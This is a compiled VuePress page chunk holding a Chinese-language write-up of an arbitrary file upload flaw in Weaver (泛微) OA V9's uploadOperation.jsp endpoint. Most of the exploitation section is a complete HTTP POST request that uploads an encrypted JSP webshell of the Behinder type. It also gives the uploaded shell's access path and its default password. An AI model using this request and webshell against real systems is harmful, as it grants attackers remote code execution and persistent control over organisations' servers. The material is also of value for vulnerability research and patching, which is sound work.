import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA V9 存在文件上传接口导致任意文件上传
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA V9
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞位于: /page/exportImport/uploadOperation.jsp文件中</p><p>Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接上传了,啊哈哈哈哈哈</p><p>重点关注File file=new File(savepath+filename),</p><p>Filename参数,是前台可控的,并且没有做任何过滤限制</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091041790.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用非常简单,只要对着</p><p>/page/exportImport/uploadOperation.jsp</p><p>来一个multipartRequest就可以</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091041826.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后请求 然后请求路径:</p><p>page/exportImport/fileTransfer/1.jsp</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091042495.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>请求包</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: <span class="token number">397</span>
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: <span class="token number">1</span>
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68
Origin: null
Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>----WebKitFormBoundary6XgyjB6SeCArD3Hc
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-GB<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.6</span>
dnt: <span class="token number">1</span>
x-forwarded-for: <span class="token number">127.0</span>.0.1
Connection: close

------WebKitFormBoundary6XgyjB6SeCArD3Hc
Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">&quot;test.jsp&quot;</span>
Content-Type: application/octet-stream

<span class="token operator">&lt;</span>%@page <span class="token assign-left variable">import</span><span class="token operator">=</span><span class="token string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%<span class="token operator">&gt;</span><span class="token operator">&lt;</span>%<span class="token operator">!</span>class U extends ClassLoader<span class="token punctuation">{</span>U<span class="token punctuation">(</span>ClassLoader c<span class="token punctuation">)</span><span class="token punctuation">{</span>super<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>public Class g<span class="token punctuation">(</span>byte <span class="token punctuation">[</span><span class="token punctuation">]</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span>return super.defineClass<span class="token punctuation">(</span>b,0,b.length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>%<span class="token operator">&gt;</span><span class="token operator">&lt;</span>%if <span class="token punctuation">(</span>request.getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">))</span><span class="token punctuation">{</span>String <span class="token assign-left variable">k</span><span class="token operator">=</span><span class="token string">&quot;e45e329feb5d925b&quot;</span><span class="token punctuation">;</span>session.putValue<span class="token punctuation">(</span><span class="token string">&quot;u&quot;</span>,k<span class="token punctuation">)</span><span class="token punctuation">;</span>Cipher <span class="token assign-left variable">c</span><span class="token operator">=</span>Cipher.getInstance<span class="token punctuation">(</span><span class="token string">&quot;AES&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c.init<span class="token punctuation">(</span><span class="token number">2</span>,new SecretKeySpec<span class="token punctuation">(</span>k.getBytes<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">&quot;AES&quot;</span><span class="token punctuation">))</span><span class="token punctuation">;</span>new U<span class="token punctuation">(</span>this.getClass<span class="token punctuation">(</span><span class="token punctuation">)</span>.getClassLoader<span class="token punctuation">(</span><span class="token punctuation">))</span>.g<span class="token punctuation">(</span>c.doFinal<span class="token punctuation">(</span>new sun.misc.BASE64Decoder<span class="token punctuation">(</span><span class="token punctuation">)</span>.decodeBuffer<span class="token punctuation">(</span>request.getReader<span class="token punctuation">(</span><span class="token punctuation">)</span>.readLine<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">))</span>.newInstance<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>%<span class="token operator">&gt;</span>
------WebKitFormBoundary6XgyjB6SeCArD3Hc--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>地址: /page/exportImport/fileTransfer/test.jsp</p><p>默认密码 rebeyond</p>`,21),o=[p];function c(i,l){return a(),s("div",null,o)}const k=n(e,[["render",c],["__file","泛微OA uploadOperation.jsp 任意文件上传.html.vue"]]);export{k as default};
